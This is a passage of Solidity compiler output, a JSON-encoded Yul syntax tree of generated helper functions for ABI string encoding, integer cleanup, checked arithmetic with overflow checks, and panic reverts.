																			"src": "988:21:10"
																		},
																		"nodeType": "YulFunctionCall",
																		"src": "988:29:10"
																	}
																],
																"functionName": {
																	"name": "add",
																	"nodeType": "YulIdentifier",
																	"src": "979:3:10"
																},
																"nodeType": "YulFunctionCall",
																"src": "979:39:10"
															},
															"variableNames": [
																{
																	"name": "end",
																	"nodeType": "YulIdentifier",
																	"src": "972:3:10"
																}
															]
														}
													]
												},
												"name": "abi_encode_t_string_memory_ptr_to_t_string_memory_ptr_fromStack",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "value",
														"nodeType": "YulTypedName",
														"src": "720:5:10",
														"type": ""
													},
													{
														"name": "pos",
														"nodeType": "YulTypedName",
														"src": "727:3:10",
														"type": ""
													}
												],
												"returnVariables": [
													{
														"name": "end",
														"nodeType": "YulTypedName",
														"src": "735:3:10",
														"type": ""
													}
												],
												"src": "647:377:10"
											},
											{
												"body": {
													"nodeType": "YulBlock",
													"src": "1148:195:10",
													"statements": [
														{
															"nodeType": "YulAssignment",
															"src": "1158:26:10",
															"value": {
																"arguments": [
																	{
																		"name": "headStart",
																		"nodeType": "YulIdentifier",
																		"src": "1170:9:10"
																	},
																	{
																		"kind": "number",
																		"nodeType": "YulLiteral",
																		"src": "1181:2:10",
																		"type": "",
																		"value": "32"
																	}
																],
																"functionName": {
																	"name": "add",
																	"nodeType": "YulIdentifier",
																	"src": "1166:3:10"
																},
																"nodeType": "YulFunctionCall",
																"src": "1166:18:10"
															},
															"variableNames": [
																{
																	"name": "tail",
																	"nodeType": "YulIdentifier",
																	"src": "1158:4:10"
																}
															]
														},
														{
															"expression": {
																"arguments": [
																	{
																		"arguments": [
																			{
																				"name": "headStart",
																				"nodeType": "YulIdentifier",
																				"src": "1205:9:10"
																			},
																			{
																				"kind": "number",
																				"nodeType": "YulLiteral",
																				"src": "1216:1:10",
																				"type": "",
																				"value": "0"
																			}
																		],
																		"functionName": {
																			"name": "add",
																			"nodeType": "YulIdentifier",
																			"src": "1201:3:10"
																		},
																		"nodeType": "YulFunctionCall",
																		"src": "1201:17:10"
																	},
																	{
																		"arguments": [
																			{
																				"name": "tail",
																				"nodeType": "YulIdentifier",
																				"src": "1224:4:10"
																			},
																			{
																				"name": "headStart",
																				"nodeType": "YulIdentifier",
																				"src": "1230:9:10"
																			}
																		],
																		"functionName": {
																			"name": "sub",
																			"nodeType": "YulIdentifier",
																			"src": "1220:3:10"
																		},
																		"nodeType": "YulFunctionCall",
																		"src": "1220:20:10"
																	}
																],
																"functionName": {
																	"name": "mstore",
																	"nodeType": "YulIdentifier",
																	"src": "1194:6:10"
																},
																"nodeType": "YulFunctionCall",
																"src": "1194:47:10"
															},
															"nodeType": "YulExpressionStatement",
															"src": "1194:47:10"
														},
														{
															"nodeType": "YulAssignment",
															"src": "1250:86:10",
															"value": {
																"arguments": [
																	{
																		"name": "value0",
																		"nodeType": "YulIdentifier",
																		"src": "1322:6:10"
																	},
																	{
																		"name": "tail",
																		"nodeType": "YulIdentifier",
																		"src": "1331:4:10"
																	}
																],
																"functionName": {
																	"name": "abi_encode_t_string_memory_ptr_to_t_string_memory_ptr_fromStack",
																	"nodeType": "YulIdentifier",
																	"src": "1258:63:10"
																},
																"nodeType": "YulFunctionCall",
																"src": "1258:78:10"
															},
															"variableNames": [
																{
																	"name": "tail",
																	"nodeType": "YulIdentifier",
																	"src": "1250:4:10"
																}
															]
														}
													]
												},
												"name": "abi_encode_tuple_t_string_memory_ptr__to_t_string_memory_ptr__fromStack_reversed",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "headStart",
														"nodeType": "YulTypedName",
														"src": "1120:9:10",
														"type": ""
													},
													{
														"name": "value0",
														"nodeType": "YulTypedName",
														"src": "1132:6:10",
														"type": ""
													}
												],
												"returnVariables": [
													{
														"name": "tail",
														"nodeType": "YulTypedName",
														"src": "1143:4:10",
														"type": ""
													}
												],
												"src": "1030:313:10"
											},
											{
												"body": {
													"nodeType": "YulBlock",
													"src": "1394:81:10",
													"statements": [
														{
															"nodeType": "YulAssignment",
															"src": "1404:65:10",
															"value": {
																"arguments": [
																	{
																		"name": "value",
																		"nodeType": "YulIdentifier",
																		"src": "1419:5:10"
																	},
																	{
																		"kind": "number",
																		"nodeType": "YulLiteral",
																		"src": "1426:42:10",
																		"type": "",
																		"value": "0xffffffffffffffffffffffffffffffffffffffff"
																	}
																],
																"functionName": {
																	"name": "and",
																	"nodeType": "YulIdentifier",
																	"src": "1415:3:10"
																},
																"nodeType": "YulFunctionCall",
																"src": "1415:54:10"
															},
															"variableNames": [
																{
																	"name": "cleaned",
																	"nodeType": "YulIdentifier",
																	"src": "1404:7:10"
																}
															]
														}
													]
												},
												"name": "cleanup_t_uint160",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "value",
														"nodeType": "YulTypedName",
														"src": "1376:5:10",
														"type": ""
													}
												],
												"returnVariables": [
													{
														"name": "cleaned",
														"nodeType": "YulTypedName",
														"src": "1386:7:10",
														"type": ""
													}
												],
												"src": "1349:126:10"
											},
											{
												"body": {
													"nodeType": "YulBlock",
													"src": "1509:152:10",
													"statements": [
														{
															"expression": {
																"arguments": [
																	{
																		"kind": "number",
																		"nodeType": "YulLiteral",
																		"src": "1526:1:10",
																		"type": "",
																		"value": "0"
																	},
																	{
																		"kind": "number",
																		"nodeType": "YulLiteral",
																		"src": "1529:77:10",
																		"type": "",
																		"value": "35408467139433450592217433187231851964531694900788300625387963629091585785856"
																	}
																],
																"functionName": {
																	"name": "mstore",
																	"nodeType": "YulIdentifier",
																	"src": "1519:6:10"
																},
																"nodeType": "YulFunctionCall",
																"src": "1519:88:10"
															},
															"nodeType": "YulExpressionStatement",
															"src": "1519:88:10"
														},
														{
															"expression": {
																"arguments": [
																	{
																		"kind": "number",
																		"nodeType": "YulLiteral",
																		"src": "1623:1:10",
																		"type": "",
																		"value": "4"
																	},
																	{
																		"kind": "number",
																		"nodeType": "YulLiteral",
																		"src": "1626:4:10",
																		"type": "",
																		"value": "0x11"
																	}
																],
																"functionName": {
																	"name": "mstore",
																	"nodeType": "YulIdentifier",
																	"src": "1616:6:10"
																},
																"nodeType": "YulFunctionCall",
																"src": "1616:15:10"
															},
															"nodeType": "YulExpressionStatement",
															"src": "1616:15:10"
														},
														{
															"expression": {
																"arguments": [
																	{
																		"kind": "number",
																		"nodeType": "YulLiteral",
																		"src": "1647:1:10",
																		"type": "",
																		"value": "0"
																	},
																	{
																		"kind": "number",
																		"nodeType": "YulLiteral",
																		"src": "1650:4:10",
																		"type": "",
																		"value": "0x24"
																	}
																],
																"functionName": {
																	"name": "revert",
																	"nodeType": "YulIdentifier",
																	"src": "1640:6:10"
																},
																"nodeType": "YulFunctionCall",
																"src": "1640:15:10"
															},
															"nodeType": "YulExpressionStatement",
															"src": "1640:15:10"
														}
													]
												},
												"name": "panic_error_0x11",
												"nodeType": "YulFunctionDefinition",
												"src": "1481:180:10"
											},
											{
												"body": {
													"nodeType": "YulBlock",
													"src": "1715:362:10",
													"statements": [
														{
															"nodeType": "YulAssignment",
															"src": "1725:25:10",
															"value": {
																"arguments": [
																	{
																		"name": "x",
																		"nodeType": "YulIdentifier",
																		"src": "1748:1:10"
																	}
																],
																"functionName": {
																	"name": "cleanup_t_uint160",
																	"nodeType": "YulIdentifier",
																	"src": "1730:17:10"
																},
																"nodeType": "YulFunctionCall",
																"src": "1730:20:10"
															},
															"variableNames": [
																{
																	"name": "x",
																	"nodeType": "YulIdentifier",
																	"src": "1725:1:10"
																}
															]
														},
														{
															"nodeType": "YulAssignment",
															"src": "1759:25:10",
															"value": {
																"arguments": [
																	{
																		"name": "y",
																		"nodeType": "YulIdentifier",
																		"src": "1782:1:10"
																	}
																],
																"functionName": {
																	"name": "cleanup_t_uint160",
																	"nodeType": "YulIdentifier",
																	"src": "1764:17:10"
																},
																"nodeType": "YulFunctionCall",
																"src": "1764:20:10"
															},
															"variableNames": [
																{
																	"name": "y",
																	"nodeType": "YulIdentifier",
																	"src": "1759:1:10"
																}
															]
														},
														{
															"nodeType": "YulVariableDeclaration",
															"src": "1793:28:10",
															"value": {
																"arguments": [
																	{
																		"name": "x",
																		"nodeType": "YulIdentifier",
																		"src": "1816:1:10"
																	},
																	{
																		"name": "y",
																		"nodeType": "YulIdentifier",
																		"src": "1819:1:10"
																	}
																],
																"functionName": {
																	"name": "mul",
																	"nodeType": "YulIdentifier",
																	"src": "1812:3:10"
																},
																"nodeType": "YulFunctionCall",
																"src": "1812:9:10"
															},
															"variables": [
																{
																	"name": "product_raw",
																	"nodeType": "YulTypedName",
																	"src": "1797:11:10",
																	"type": ""
																}
															]
														},
														{
															"nodeType": "YulAssignment",
															"src": "1830:41:10",
															"value": {
																"arguments": [
																	{
																		"name": "product_raw",
																		"nodeType": "YulIdentifier",
																		"src": "1859:11:10"
																	}
																],
																"functionName": {
																	"name": "cleanup_t_uint160",
																	"nodeType": "YulIdentifier",
																	"src": "1841:17:10"
																},
																"nodeType": "YulFunctionCall",
																"src": "1841:30:10"
															},
															"variableNames": [
																{
																	"name": "product",
																	"nodeType": "YulIdentifier",
																	"src": "1830:7:10"
																}
															]
														},
														{
															"body": {
																"nodeType": "YulBlock",
																"src": "2048:22:10",
																"statements": [
																	{
																		"expression": {
																			"arguments": [],
																			"functionName": {
																				"name": "panic_error_0x11",
																				"nodeType": "YulIdentifier",
																				"src": "2050:16:10"
																			},
																			"nodeType": "YulFunctionCall",
																			"src": "2050:18:10"
																		},
																		"nodeType": "YulExpressionStatement",
																		"src": "2050:18:10"
																	}
																]
															},
															"condition": {
																"arguments": [
																	{
																		"arguments": [
																			{
																				"arguments": [
																					{
																						"name": "x",
																						"nodeType": "YulIdentifier",
																						"src": "1981:1:10"
																					}
																				],
																				"functionName": {
																					"name": "iszero",
																					"nodeType": "YulIdentifier",
																					"src": "1974:6:10"
																				},
																				"nodeType": "YulFunctionCall",
																				"src": "1974:9:10"
																			},
																			{
																				"arguments": [
																					{
																						"name": "y",
																						"nodeType": "YulIdentifier",
																						"src": "2004:1:10"
																					},
																					{
																						"arguments": [
																							{
																								"name": "product",
																								"nodeType": "YulIdentifier",
																								"src": "2011:7:10"
																							},
																							{
																								"name": "x",
																								"nodeType": "YulIdentifier",
																								"src": "2020:1:10"
																							}
																						],
																						"functionName": {
																							"name": "div",
																							"nodeType": "YulIdentifier",
																							"src": "2007:3:10"
																						},
																						"nodeType": "YulFunctionCall",
																						"src": "2007:15:10"
																					}
																				],
																				"functionName": {
																					"name": "eq",
																					"nodeType": "YulIdentifier",
																					"src": "2001:2:10"
																				},
																				"nodeType": "YulFunctionCall",
																				"src": "2001:22:10"
																			}
																		],
																		"functionName": {
																			"name": "or",
																			"nodeType": "YulIdentifier",
																			"src": "1954:2:10"
																		},
																		"nodeType": "YulFunctionCall",
																		"src": "1954:83:10"
																	}
																],
																"functionName": {
																	"name": "iszero",
																	"nodeType": "YulIdentifier",
																	"src": "1934:6:10"
																},
																"nodeType": "YulFunctionCall",
																"src": "1934:113:10"
															},
															"nodeType": "YulIf",
															"src": "1931:139:10"
														}
													]
												},
												"name": "checked_mul_t_uint160",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "x",
														"nodeType": "YulTypedName",
														"src": "1698:1:10",
														"type": ""
													},
													{
														"name": "y",
														"nodeType": "YulTypedName",
														"src": "1701:1:10",
														"type": ""
													}
												],
												"returnVariables": [
													{
														"name": "product",
														"nodeType": "YulTypedName",
														"src": "1707:7:10",
														"type": ""
													}
												],
												"src": "1667:410:10"
											},
											{
												"body": {
													"nodeType": "YulBlock",
													"src": "2111:152:10",
													"statements": [
														{
															"expression": {
																"arguments": [
																	{
																		"kind": "number",
																		"nodeType": "YulLiteral",
																		"src": "2128:1:10",
																		"type": "",
																		"value": "0"
																	},
																	{
																		"kind": "number",
																		"nodeType": "YulLiteral",
																		"src": "2131:77:10",
																		"type": "",
																		"value": "35408467139433450592217433187231851964531694900788300625387963629091585785856"
																	}
																],
																"functionName": {
																	"name": "mstore",
																	"nodeType": "YulIdentifier",
																	"src": "2121:6:10"
																},
																"nodeType": "YulFunctionCall",
																"src": "2121:88:10"
															},
															"nodeType": "YulExpressionStatement",
															"src": "2121:88:10"
														},
														{
															"expression": {
																"arguments": [
																	{
																		"kind": "number",
																		"nodeType": "YulLiteral",
																		"src": "2225:1:10",
																		"type": "",
																		"value": "4"
																	},
																	{
																		"kind": "number",
																		"nodeType": "YulLiteral",
																		"src": "2228:4:10",
																		"type": "",
																		"value": "0x32"
																	}
																],
																"functionName": {
																	"name": "mstore",
																	"nodeType": "YulIdentifier",
																	"src": "2218:6:10"
																},
																"nodeType": "YulFunctionCall",
																"src": "2218:15:10"
															},
															"nodeType": "YulExpressionStatement",
															"src": "2218:15:10"
														},
														{
															"expression": {
																"arguments": [
																	{
																		"kind": "number",
																		"nodeType": "YulLiteral",
																		"src": "2249:1:10",
																		"type": "",
																		"value": "0"
																	},
																	{
																		"kind": "number",
																		"nodeType": "YulLiteral",
																		"src": "2252:4:10",
																		"type": "",
																		"value": "0x24"
																	}
																],
																"functionName": {
																	"name": "revert",
																	"nodeType": "YulIdentifier",
																	"src": "2242:6:10"
																},
																"nodeType": "YulFunctionCall",
																"src": "2242:15:10"
															},
															"nodeType": "YulExpressionStatement",
															"src": "2242:15:10"
														}
													]
												},
												"name": "panic_error_0x32",
												"nodeType": "YulFunctionDefinition",
												"src": "2083:180:10"
											},
											{
												"body": {
													"nodeType": "YulBlock",
													"src": "2314:32:10",
													"statements": [
														{
															"nodeType": "YulAssignment",
															"src": "2324:16:10",
															"value": {
																"name": "value",
																"nodeType": "YulIdentifier",
																"src": "2335:5:10"
															},
															"variableNames": [
																{
																	"name": "cleaned",
																	"nodeType": "YulIdentifier",
																	"src": "2324:7:10"
																}
															]
														}
													]
												},
												"name": "cleanup_t_uint256",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "value",
														"nodeType": "YulTypedName",
														"src": "2296:5:10",
														"type": ""
													}
												],
												"returnVariables": [
													{
														"name": "cleaned",
														"nodeType": "YulTypedName",
														"src": "2306:7:10",
														"type": ""
													}
												],
												"src": "2269:77:10"
											},
											{
												"body": {
													"nodeType": "YulBlock",
													"src": "2396:147:10",
													"statements": [
														{
															"nodeType": "YulAssignment",
															"src": "2406:25:10",
															"value": {
																"arguments": [
																	{
																		"name": "x",
																		"nodeType": "YulIdentifier",
																		"src": "2429:1:10"
																	}
																],
																"functionName": {
																	"name": "cleanup_t_uint256",
																	"nodeType": "YulIdentifier",
																	"src": "2411:17:10"
																},
																"nodeType": "YulFunctionCall",
																"src": "2411:20:10"
															},
															"variableNames": [
																{
																	"name": "x",
																	"nodeType": "YulIdentifier",
																	"src": "2406:1:10"
																}
															]
														},
														{
															"nodeType": "YulAssignment",
															"src": "2440:25:10",
															"value": {
																"arguments": [
																	{
																		"name": "y",
																		"nodeType": "YulIdentifier",
																		"src": "2463:1:10"
																	}
																],
																"functionName": {
																	"name": "cleanup_t_uint256",
																	"nodeType": "YulIdentifier",
																	"src": "2445:17:10"
																},
																"nodeType": "YulFunctionCall",
																"src": "2445:20:10"
															},
															"variableNames": [
																{
																	"name": "y",
																	"nodeType": "YulIdentifier",
																	"src": "2440:1:10"
																}
															]
														},
														{
															"nodeType": "YulAssignment",
															"src": "2474:16:10",
															"value": {
																"arguments": [
																	{
																		"name": "x",
																		"nodeType": "YulIdentifier",
																		"src": "2485:1:10"
																	},
																	{
																		"name": "y",
																		"nodeType": "YulIdentifier",
																		"src": "2488:1:10"
																	}
																],
																"functionName": {
																	"name": "add",
																	"nodeType": "YulIdentifier",
																	"src": "2481:3:10"
																},
																"nodeType": "YulFunctionCall",
																"src": "2481:9:10"
															},
															"variableNames": [
																{
																	"name": "sum",
																	"nodeType": "YulIdentifier",
																	"src": "2474:3:10"
																}
															]
														},
														{
															"body": {
																"nodeType": "YulBlock",
																"src": "2514:22:10",
																"statements": [
																	{
																		"expression": {
																			"arguments": [],
																			"functionName": {
																				"name": "panic_error_0x11",
																				"nodeType": "YulIdentifier",
																				"src": "2516:16:10"
																			},
																			"nodeType": "YulFunctionCall",
																			"src": "2516:18:10"
																		},
																		"nodeType": "YulExpressionStatement",
																		"src": "2516:18:10"
																	}
																]
															},
															"condition": {
																"arguments": [
																	{
																		"name": "x",
																		"nodeType": "YulIdentifier",
																		"src": "2506:1:10"
																	},
																	{
																		"name": "sum",
																		"nodeType": "YulIdentifier",
																		"src": "2509:3:10"
																	}
																],
																"functionName": {
																	"name": "gt",
																	"nodeType": "YulIdentifier",
																	"src": "2503:2:10"
																},
																"nodeType": "YulFunctionCall",
																"src": "2503:10:10"
															},
															"nodeType": "YulIf",
															"src": "2500:36:10"
														}
													]
												},
												"name": "checked_add_t_uint256",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "x",
														"nodeType": "YulTypedName",
														"src": "2383:1:10",
														"type": ""
													},
													{
														"name": "y",
														"nodeType": "YulTypedName",
														"src": "2386:1:10",
														"type": ""
													}
												],
												"returnVariables": [
													{
														"name": "sum",
														"nodeType": "YulTypedName",
														"src": "2392:3:10",
														"type": ""
													}
												],
												"src": "2352:191:10"
											},
											{
												"body": {
													"nodeType": "YulBlock",
													"src": "2594:190:10",
													"statements": [
														{
															"nodeType": "YulAssignment",
															"src": "2604:25:10",
															"value": {
																"arguments": [
																	{
																		"name": "x",
																		"nodeType": "YulIdentifier",
																		"src": "2627:1:10"
																	}
																],
																"functionName": {
																	"name": "cleanup_t_uint160",
																	"nodeType": "YulIdentifier",
																	"src": "2609:17:10"
																},
																"nodeType": "YulFunctionCall",
																"src": "2609:20:10"
															},
															"variableNames": [
																{
																	"name": "x",
																	"nodeType": "YulIdentifier",
																	"src": "2604:1:10"
																}
															]
														},
														{
															"nodeType": "YulAssignment",
															"src": "2638:25:10",
															"value": {
																"arguments": [
																	{
																		"name": "y",
																		"nodeType": "YulIdentifier",
																		"src": "2661:1:10"
																	}
																],
																"functionName": {
																	"name": "cleanup_t_uint160",
																	"nodeType": "YulIdentifier",
																	"src": "2643:17:10"
																},
																"nodeType": "YulFunctionCall",
																"src": "2643:20:10"
															},
															"variableNames": [
																{
																	"name": "y",
																	"nodeType": "YulIdentifier",
																	"src": "2638:1:10"
																}
															]
														},
														{
															"nodeType": "YulAssignment",
															"src": "2672:17:10",
															"value": {
																"arguments": [
																	{
																		"name": "x",
																		"nodeType": "YulIdentifier",
																		"src": "2684:1:10"
																	},
																	{
																		"name": "y",
																		"nodeType": "YulIdentifier",
																		"src": "2687:1:10"
																	}
																],
																"functionName": {
																	"name": "sub",
																	"nodeType": "YulIdentifier",
																	"src": "2680:3:10"
																},
																"nodeType": "YulFunctionCall",
																"src": "2680:9:10"
															},
															"variableNames": [
																{
																	"name": "diff",
																	"nodeType": "YulIdentifier",
																	"src": "2672:4:10"
																}
															]
														},
														{
															"body": {
																"nodeType": "YulBlock",
																"src": "2755:22:10",
																"statements": [
																	{
																		"expression": {
																			"arguments": [],
																			"functionName": {
																				"name": "panic_error_0x11",
																				"nodeType": "YulIdentifier",
																				"src": "2757:16:10"
																			},
																			"nodeType": "YulFunctionCall",
																			"src": "2757:18:10"
																		},
																		"nodeType": "YulExpressionStatement",
																		"src": "2757:18:10"
																	}
																]
															},
															"condition": {
																"arguments": [
																	{
																		"name": "diff",
																		"nodeType": "YulIdentifier",
																		"src": "2705:4:10"
																	},
																	{
																		"kind": "number",
																		"nodeType": "YulLiteral",
																		"src": "2711:42:10",
																		"type": "",
																		"value": "0xffffffffffffffffffffffffffffffffffffffff"
																	}
																],
																"functionName": {
																	"name": "gt",
																	"nodeType": "YulIdentifier",
																	"src": "2702:2:10"
																},
																"nodeType": "YulFunctionCall",
																"src": "2702:52:10"
															},
															"nodeType": "YulIf",
															"src": "2699:78:10"
														}
													]
												},
												"name": "checked_sub_t_uint160",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "x",
														"nodeType": "YulTypedName",
														"src": "2580:1:10",
														"type": ""
													},
													{
														"name": "y",
														"nodeType": "YulTypedName",
														"src": "2583:1:10",
														"type": ""
													}
												],
												"returnVariables": [
													{
														"name": "diff",
														"nodeType": "YulTypedName",
														"src": "2589:4:10",
														"type": ""
													}
												],
												"src": "2549:235:10"
											},
											{
												"body": {
													"nodeType": "YulBlock",
													"src": "2834:188:10",
													"statements": [
														{
															"nodeType": "YulAssignment",
															"src": "2844:25:10",
															"value": {
																"arguments": [
																	{
																		"name": "x",
																		"nodeType": "YulIdentifier",
																		"src": "2867:1:10"
																	}
																],
																"functionName": {
																	"name": "cleanup_t_uint160",
																	"nodeType": "YulIdentifier",
																	"src": "2849:17:10"
																},
																"nodeType": "YulFunctionCall",
																"src": "2849:20:10"
															},
															"variableNames": [
																{
																	"name": "x",
																	"nodeType": "YulIdentifier",
																	"src": "2844:1:10"
																}
															]
														},
														{
															"nodeType": "YulAssignment",
															"src": "2878:25:10",
															"value": {
																"arguments": [
																	{
																		"name": "y",
																		"nodeType": "YulIdentifier",
																		"src": "2901:1:10"
																	}
																],
																"functionName": {
																	"name": "cleanup_t_uint160",
																	"nodeType": "YulIdentifier",
																	"src": "2883:17:10"
																},
																"nodeType": "YulFunctionCall",
																"src": "2883:20:10"
															},
															"variableNames": [
																{
																	"name": "y",
																	"nodeType": "YulIdentifier",
																	"src": "2878:1:10"
																}
															]
														},
														{
															"nodeType": "YulAssignment",
															"src": "2912:16:10",
															"value": {
																"arguments": [
																	{
																		"name": "x",
																		"nodeType": "YulIdentifier",
																		"src": "2923:1:10"
																	},
																	{
																		"name": "y",
																		"nodeType": "YulIdentifier",
																		"src": "2926:1:10"
																	}
																],
																"functionName": {
																	"name": "add",
																	"nodeType": "YulIdentifier",
																	"src": "2919:3:10"
																},
																"nodeType": "YulFunctionCall",
																"src": "2919:9:10"
															},
															"variableNames": [
																{
																	"name": "sum",
																	"nodeType": "YulIdentifier",
																	"src": "2912:3:10"
																}
															]
														},
														{
															"body": {
																"nodeType": "YulBlock",
																"src": "2993:22:10",
																"statements": [
																	{
																		"expression": {
																			"arguments": [],
																			"functionName": {
																				"name": "panic_error_0x11",
																				"nodeType": "YulIdentifier",
																				"src": "2995:16:10"
																			},
																			"nodeType": "YulFunctionCall",
																			"src": "2995:18:10"
																		},
																		"nodeType": "YulExpressionStatement",
																		"src": "2995:18:10"
																	}
																]
															},
															"condition": {
																"arguments": [
																	{
																		"name": "sum",
																		"nodeType": "YulIdentifier",
																		"src": "2944:3:10"
																	},
																	{
																		"kind": "number",
																		"nodeType": "YulLiteral",
																		"src": "2949:42:10",
																		"type": "",
																		"value": "0xffffffffffffffffffffffffffffffffffffffff"
																	}
																],
																"functionName": {
																	"name": "gt",
																	"nodeType": "YulIdentifier",
																	"src": "2941:2:10"
																},
																"nodeType": "YulFunctionCall",
																"src": "2941:51:10"
															},
															"nodeType": "YulIf",
															"src": "2938:77:10"
														}
													]
												},
												"name": "checked_add_t_uint160",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "x",
														"nodeType": "YulTypedName",
														"src": "2821:1:10",
														"type": ""
													},
													{
														"name": "y",
														"nodeType": "YulTypedName",
														"src": "2824:1:10",
														"type": ""
													}
												],
												"returnVariables": [
													{
														"name": "sum",
														"nodeType": "YulTypedName",
														"src": "2830:3:10",
														"type": ""
													}
												],
												"src": "2790:232:10"
											},
											{
												"body": {
													"nodeType": "YulBlock",
													"src": "3071:190:10",
													"statements": [
														{
															"nodeType": "YulAssignment",
															"src": "3081:33:10",
															"value": {
																"arguments": [
																	{
																		"name": "value",
																		"nodeType": "YulIdentifier",
																		"src": "3108:5:10"
																	}
																],
																"functionName": {
																	"name": "cleanup_t_uint256",
																	"nodeType": "YulIdentifier",
																	"src": "3090:17:10"
																},
																"nodeType": "YulFunctionCall",
																"src": "3090:24:10"
															},
															"variableNames": [
																{
																	"name": "value",
																	"nodeType": "YulIdentifier",
																	"src": "3081:5:10"
																}
															]
														},
														{
															"body": {
																"nodeType": "YulBlock",
																"src": "3204:22:10",
																"statements": [
																	{
																		"expression": {
																			"arguments": [],
																			"functionName": {
																				"name": "panic_error_0x11",
																				"nodeType": "YulIdentifier",
																				"src": "3206:16:10"
																			},
																			"nodeType": "YulFunctionCall",
																			"src": "3206:18:10"
																		},
																		"nodeType": "YulExpressionStatement",
																		"src": "3206:18:10"
																	}
																]
															},
															"condition": {
																"arguments": [
																	{
																		"name": "value",
																		"nodeType": "YulIdentifier",
																		"src": "3129:5:10"
																	},
																	{
																		"kind": "number",
																		"nodeType": "YulLiteral",
																		"src": "3136:66:10",
																		"type": "",
																		"value": "0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff"
																	}
																],
																"functionName": {
																	"name": "eq",
																	"nodeType": "YulIdentifier",
																	"src": "3126:2:10"
																},
																"nodeType": "YulFunctionCall",
																"src": "3126:77:10"
															},
															"nodeType": "YulIf",
															"src": "3123:103:10"
														},
														{
															"nodeType": "YulAssignment",
															"src": "3235:20:10",
															"value": {
																"arguments": [
																	{
																		"name": "value",
																		"nodeType": "YulIdentifier",
																		"src": "3246:5:10"
																	},
																	{
																		"kind": "number",
																		"nodeType": "YulLiteral",
																		"src": "3253:1:10",
																		"type": "",
																		"value": "1"
																	}
																],
																"functionName": {
																	"name": "add",
																	"nodeType": "YulIdentifier",
																	"src": "3242:3:10"
																},
																"nodeType": "YulFunctionCall",
																"src": "3242:13:10"
															},
															"variableNames": [
																{
																	"name": "ret",
																	"nodeType": "YulIdentifier",
																	"src": "3235:3:10"
																}
															]
														}
													]
												},
												"name": "increment_t_uint256",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "value",
														"nodeType": "YulTypedName",
														"src": "3057:5:10",
														"type": ""
													}
												],
												"returnVariables": [
													{
														"name": "ret",
														"nodeType": "YulTypedName",
														"src": "3067:3:10",
														"type": ""
													}
												],
												"src": "3028:233:10"
											},
											{
												"body": {
													"nodeType": "YulBlock",
													"src": "3295:152:10",
													"statements": [
														{
															"expression": {
																"arguments": [
																	{
																		"kind": "number",
																		"nodeType": "YulLiteral",
																		"src": "3312:1:10",
																		"type": "",
																		"value": "0"
																	},
																	{
																		"kind": "number",
																		"nodeType": "YulLiteral",
																		"src": "3315:77:10",
																		"type": "",
																		"value": "35408467139433450592217433187231851964531694900788300625387963629091585785856"
																	}
																],
																"functionName": {
																	"name": "mstore",
																	"nodeType": "YulIdentifier",
																	"src": "3305:6:10"
																},
																"nodeType": "YulFunctionCall",
																"src": "3305:88:10"
															},
															"nodeType": "YulExpressionStatement",
															"src": "3305:88:10"
														},
														{
															"expression": {
																"arguments": [
																	{
																		"kind": "number",
																		"nodeType": "YulLiteral",
																		"src": "3409:1:10",
																		"type": "",
																		"value": "4"
																	},
																	{
																		"kind": "number",
																		"nodeType": "YulLiteral",
																		"src": "3412:4:10",
																		"type": "",
																		"value": "0x12"
																	}
																],
																"functionName": {
																	"name": "mstore",
																	"nodeType": "YulIdentifier",
																	"src": "3402:6:10"
																},
																"nodeType": "YulFunctionCall",
																"src": "3402:15:10"
															},
															"nodeType": "YulExpressionStatement",
															"src": "3402:15:10"
														},
														{
															"expression": {
																"arguments": [
																	{
																		"kind": "number",
																		"nodeType": "YulLiteral",
																		"src": "3433:1:10",
																		"type": "",
																		"value": "0"
																	},
																	{
																		"kind": "number",
																		"nodeType": "YulLiteral",
																		"src": "3436:4:10",
																		"type": "",
																		"value": "0x24"
																	}
																],
																"functionName": {
																	"name": "revert",
																	"nodeType": "YulIdentifier",
																	"src": "3426:6:10"
																},
																"nodeType": "YulFunctionCall",
																"src": "3426:15:10"
															},
															"nodeType": "YulExpressionStatement",
															"src": "3426:15:10"
														}
													]
												},
												"name": "panic_error_0x12",
												"nodeType": "YulFunctionDefinition",
												"src": "3267:180:10"
											},
											{
												"body": {
													"nodeType": "YulBlock",
													"src": "3495:143:10",
													"statements": [
														{
															"nodeType": "YulAssignment",
															"src": "3505:25:10",
															"value": {
																"arguments": [
																	{
																		"name": "x",
																		"nodeType": "YulIdentifier",
																		"src": "3528:1:10"
																	}
																],
																"functionName": {
																	"name": "cleanup_t_uint256",
																	"nodeType": "YulIdentifier",
																	"src": "3510:17:10"
																},
																"nodeType": "YulFunctionCall",
																"src": "3510:20:10"
															},
															"variableNames": [
																{
																	"name": "x",
																	"nodeType": "YulIdentifier",
																	"src": "3505:1:10"
																}
															]
														},
														{
															"nodeType": "YulAssignment",
															"src": "3539:25:10",
															"value": {
																"arguments": [
																	{
																		"name": "y",
																		"nodeType": "YulIdentifier",
																		"src": "3562:1:10"
																	}
																],
																"functionName": {
																	"name": "cleanup_t_uint256",
																	"nodeType": "YulIdentifier",
																	"src": "3544:17:10"
																},
																"nodeType": "YulFunctionCall",
																"src": "3544:20:10"
															},
															"variableNames": [
																{
																	"name": "y",
																	"nodeType": "YulIdentifier",
																	"src": "3539:1:10"
																}
															]
														},
														{
															"body": {
																"nodeType": "YulBlock",
																"src": "3586:22:10",
																"statements": [
																	{
																		"expression": {
																			"arguments": [],
																			"functionName": {
																				"name": "panic_error_0x12",
																				"nodeType": "YulIdentifier",
																				"src": "3588:16:10"
																			},
																			"nodeType": "YulFunctionCall",
																			"src": "3588:18:10"
																		},
																		"nodeType": "YulExpressionStatement",
																		"src": "3588:18:10"
																	}
																]
															},
															"condition": {
																"arguments": [
																	{
																		"name": "y",
																		"nodeType": "YulIdentifier",
																		"src": "3583:1:10"
																	}
																],
																"functionName": {
																	"name": "iszero",
																	"nodeType": "YulIdentifier",
																	"src": "3576:6:10"
																},
																"nodeType": "YulFunctionCall",
																"src": "3576:9:10"
															},
